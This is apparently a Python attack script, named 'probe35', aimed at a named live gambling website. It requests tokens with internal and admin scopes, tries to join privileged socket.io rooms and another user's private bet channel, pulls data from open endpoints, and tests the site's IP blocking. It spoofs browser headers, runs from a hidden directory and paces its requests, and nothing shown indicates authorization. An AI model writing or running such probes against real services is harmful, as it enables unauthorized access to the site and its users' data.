#!/usr/bin/env python3
"""probe35: execute room-join exploits (internal:/user: channels) + open-endpoint bodies + blockCheck"""
import json
import os
import re
import time

import requests
import websocket

os.chdir("/dev/shm/.dkv")
BASE = "https://duelbits.com"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")


def hdrs(extra=None):
    h = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9", "DNT": "1",
         "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
         "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
         "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors",
         "Sec-Fetch-Site": "same-origin", "Origin": BASE, "Referer": BASE + "/"}
    if extra:
        h.update(extra)
    return h


def mint(sc):
    return requests.post(BASE + f"/auth/token?scope={sc}", headers=hdrs(), timeout=15).json().get("token", "")


# 1) internal: + user: channel contexts (local, free)
for fn in os.listdir("chunks"):
    try:
        t = open("chunks/" + fn).read()
    except Exception:
        continue
    for m in re.finditer(r".{90}internal:.{140}", t):
        print("-- internal ctx", fn[:22], ":", m.group(0).replace("\n", " ")[:240])
        break
    for m in re.finditer(r".{80}user:bet.{140}", t):
        print("-- user:bet ctx", fn[:22], ":", m.group(0).replace("\n", " ")[:240])
        break

# 2) open endpoint bodies
for path in ("/ws/games/tap-trading/bets", "/ws/games/v2/plinko", "/ws/leaderboard",
             "/ws/config/levels"):
    r = requests.get(BASE + path, headers=hdrs(), timeout=15)
    print("---", path, r.status_code, "bytes", len(r.text))
    if r.status_code == 200:
        fn = path.strip("/").replace("/", "_") + ".json"
        open(fn, "w").write(r.text)
        try:
            j = r.json()
            s = json.dumps(j)
            print("   keys/first:", s[:260])
        except Exception:
            print("   ", r.text[:200])
    time.sleep(6)

# 3) blockCheck
r = requests.get(BASE + "/auth/blockCheck", headers=hdrs(), timeout=15)
print("--- GET /auth/blockCheck:", r.status_code, r.text[:160])
r = requests.get(BASE + "/auth/blockCheck?ip=US", headers=hdrs(), timeout=15)
print("--- GET /auth/blockCheck?ip=US:", r.status_code, r.text[:160])
time.sleep(6)

# 4) socket room joins with real vocabulary, strict rhythm
def socket_join_test(nsp, scope, rooms):
    tok = mint(scope)
    ws = websocket.WebSocket(timeout=8)
    try:
        ws.connect(f"wss://duelbits.com/{nsp}/socket.io/?EIO=4&transport=websocket",
                   header=[f"Origin: {BASE}", f"User-Agent: {UA}",
                           "Accept-Language: en-US,en;q=0.9"])
        ws.recv()  # open
        ws.send('40{"token":"' + tok + '"}')
        try:
            ack = ws.recv()
            print(f"--- [{nsp}/{scope}] ns:", str(ack)[:90])
        except Exception as e:
            print(f"--- [{nsp}/{scope}] ns err:", str(e)[:70])
            return
        for room in rooms:
            ws.send('42["join",["' + room + '"]]')
            got = []
            for i in range(3):
                try:
                    f = ws.recv()
                    got.append(str(f)[:240])
                    if str(f).startswith("42["):
                        break
                except Exception:
                    got.append("quiet")
                    break
            print(f"--- [{nsp}/{scope}] join {room[:30]}:", " | ".join(got))
        # linger for pushes
        for i in range(2):
            try:
                f = ws.recv()
                print(f"--- [{nsp}/{scope}] push{i}:", str(f)[:280])
            except Exception:
                print(f"--- [{nsp}/{scope}] push{i}: quiet")
                break
        ws.close()
    except Exception as e:
        print(f"--- [{nsp}/{scope}] ERR:", str(e)[:120])


uuid = "0dae0315-7e68-402b-950c-dd6ad34ca129"
socket_join_test("ws", "internal", ["internal:config", "internal:users", "internal:admin",
                                    f"user:{uuid}:bet", f"user:{uuid}"])
time.sleep(5)
socket_join_test("gs", "admin", ["internal:config", "admin", f"user:{uuid}"])
